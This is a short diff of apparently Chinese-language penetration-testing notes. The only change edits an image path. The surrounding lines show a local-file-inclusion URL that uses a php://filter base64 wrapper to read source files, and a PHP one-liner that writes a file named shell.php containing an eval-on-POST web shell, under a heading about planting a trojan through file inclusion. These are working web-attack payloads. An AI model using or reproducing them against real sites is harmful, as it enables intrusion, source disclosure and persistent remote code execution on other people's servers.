@@ -229,7 +229,7 @@ http://asdf.com/evil.php?commond=php://filter/convert.base64-encode/resource=evi
 
 file_include传马
 
-![image-20230701162303609](C:/Users/kkk/Pictures/Typora_poto/image-20230701162303609.png)
+![image01](./photo/Penetration/01.png)
 
 ```php
 <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["bgxg"]); ?>'); ?>
